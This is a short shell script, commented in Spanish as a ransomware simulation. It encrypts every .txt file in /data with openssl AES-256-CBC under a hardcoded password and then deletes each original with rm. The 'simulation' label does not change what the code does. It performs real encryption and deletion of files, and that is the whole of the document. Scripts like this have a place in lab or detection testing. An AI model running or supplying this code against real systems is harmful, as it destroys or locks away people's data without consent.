#!/bin/sh
# Simula ransomware: encripta todos los .txt
for file in /data/*.txt; do
  openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.enc" -pass pass:Secreto2025
  rm "$file"
done
